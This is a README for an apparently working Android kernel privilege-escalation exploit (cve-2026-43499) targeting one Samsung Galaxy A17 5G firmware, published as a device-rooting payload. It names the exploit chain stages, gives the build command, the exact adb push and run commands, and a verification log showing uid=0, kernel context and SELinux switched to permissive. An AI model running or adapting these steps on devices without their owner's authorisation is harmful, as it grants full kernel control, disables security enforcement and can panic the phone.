# Experimental SM-A176U1 A176U1UES5AZD2 payload

This payload is for Galaxy A17 5G `SM-A176U1` running firmware
`A176U1UES5AZD2` and kernel `5.15.180-android13-3-32407857` only.

The MCAST build completed the full chain on real hardware from `adb shell`:
tracefs KASLR discovery, KernelSnitch `mm_struct` leak, order-3 SKB reclaim,
fake fops, configfs ARW, pipe physical read/write, and root UMH. The final
root client reported `uid=0`, `u:r:kernel:s0`, and SELinux permissive.

This profile is experimental and is not listed in the Root My Galaxy support
feed. The proven launch context is `adb shell` (`uid=2000`, `u:r:shell:s0`).
A normal APK process cannot use the required tracefs path. An APK frontend
would need to delegate the runner to an ADB-shell or Shizuku shell service;
that integration is not part of this PR.

The payload itself provides a temporary soft root only. A KernelSU LKM pair for
this same device is published alongside it under `kernelsu/`, with the load
steps and the Manager result in
[`../../docs/SM-A176U1-A176U1UES5AZD2.md`](../../docs/SM-A176U1-A176U1UES5AZD2.md)
and the rebuild recipe in [`../../kernelsu/README.md`](../../kernelsu/README.md).

## Files

| File | SHA-256 |
| --- | --- |
| `cve-2026-43499-app.so` | `258b4ecb6b6f317a7282e1030b44185ba3807c7e9c699ff81204bf786058616b` |
| `cve-2026-43499-root` | `be5a00fbf1dcce576fa5f18df99cdada9aa6918ef6cab0807495923b60e23b5d` |

Both files rebuild byte-identically from this branch.

## Build

```sh
make TARGET=a17x-A176U1UES5AZD2 ANDROID_NDK_HOME=/path/to/android-ndk
```

Use these outputs:

```text
build/a17x-A176U1UES5AZD2/cve-2026-43499-app.so
build/a17x-A176U1UES5AZD2/cve-2026-43499-root
```

## ADB shell test

Wait about one minute after boot, then push the payload and runner:

```sh
adb push cve-2026-43499-app.so /data/local/tmp/a17x.so
adb push cve-2026-43499-root /data/local/tmp/cve-2026-43499-root
adb shell chmod 644 /data/local/tmp/a17x.so
adb shell chmod 755 /data/local/tmp/cve-2026-43499-root
```

Run one attempt:

```sh
adb shell "nohup env SLIDE_SOURCE=tracefs EXPLOIT_ATTEMPTS=1 \
  P0_ATTEMPT_TIMEOUT_SEC=115 EXPLOIT_ATTEMPT_TIMEOUT_SEC=5400 \
  /data/local/tmp/cve-2026-43499-root \
  --run-payload /data/local/tmp/a17x.so \
  /data/local/tmp/cve-2026-43499-root \
  /data/local/tmp/a17x.log >/dev/null 2>&1 &"
```

Verify root with the same helper:

```sh
adb shell '/data/local/tmp/cve-2026-43499-root -c "id; getenforce"'
```

Expected:

```text
uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
Permissive
```

## Verification record

2026-10-23, exact device, published pair, clean boot, attempt 2:

```text
[+] slide-kaslr-ok source=tracefs pid=5326 base=ffffffc008160000 slide=0000000000160000 data_mode=canonical
[*] mm leaked=ffffff804576fc00 base=ffffff8045768000 object_index=32
[*] root umh result wake=1 complete=1 retval=0 socket=1
[+] pipe physrw pid=5326 done=1 root=1 kaslr=1 read_ok=1 write_ok=1 rw64=1/1 uid=2000->0
[+] exploit completed attempt=1/1
```

Attempt 1 of the same pair stopped at the PI/MCAST stage and the phone
rebooted. The exploit is probabilistic; a bad heap layout can panic the
kernel at that stage.

## Limitations

- Exact firmware only: `A176U1UES5AZD2` / kernel `5.15.180-android13-3-32407857`.
- Shell-only: the tracefs KASLR route is not available to a normal app domain.
- Temporary soft root: a reboot clears it; no partition is modified and the
  bootloader stays locked.
- Do not rerun while root is live, and do not kill the parked slide child or
  stability keeper; reboot is the safe cleanup.
